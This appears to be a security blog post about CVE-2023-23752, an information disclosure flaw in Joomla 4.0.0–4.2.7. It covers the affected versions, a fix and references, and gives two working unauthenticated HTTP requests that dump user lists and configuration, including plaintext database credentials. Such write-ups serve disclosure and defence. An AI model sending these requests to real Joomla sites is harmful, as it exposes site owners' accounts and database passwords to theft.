+++
author = "kiwiyumi"
date = "2024-02-03"
description = "Information disclosure in Joomla"
title = "Joomla 4.2.7 - Information Disclosure - CVE-2023-23752"
tags = [
    "Web",
    "CVE",
    "CMS",
    "Joomla"
]
+++

<!--more-->

In today's article we're going to look at a vulnerability in a content management system (CMS) called Joomla. The flaw allows an unauthenticated attacker to list all the users in the application and collect system configuration information, such as username and database password.

## Description

The flaw consists of poor validation of access to the endpoints responsible for listing user and database information, being classified as a medium vulnerability by **NIST** (CVSS 3.x), however, in the security advisory issued by Joomla, they define this vulnerability as a potential critical impact.

## Affected versions

The versions affected by the vulnerability are: **4.0.0 <= 4.2.7**.

## Exploiting vulnerabilities

The exploitation of the vulnerability consists of two endpoints, the first being used to collect existing users in the application, while the other consists of system configuration information (database), below are the requests to the affected endpoints and their responses.

- **Collect user information:**

```http
GET /api/index.php/v1/users?public=true HTTP/1.1
Host: {{HOST}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8


```

![](/assets/images/joomla-infomation-disclosure/f0588149-75cb-4d3c-b6f6-0c6f1f781938.png)

- **Collect configuration information:**

```http
GET /api/index.php/v1/config/application?public=true HTTP/1.1
Host: {{HOST}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8


```

![](/assets/images/joomla-infomation-disclosure/7f91a6f8-2d92-46ae-9bed-9f64bf375db5.png)

Note that it was possible to collect sensitive information and passwords in plain text.

**Obs:** the first endpoint in question brings up all existing users, in my lab I only had the administrator registered.

## How to fix

Update the software to the latest version.

## References

- https://developer.joomla.org/security-centre/894-20230201-core-improper-access-check-in-webservice-endpoints.html
- https://nvd.nist.gov/vuln/detail/CVE-2023-23752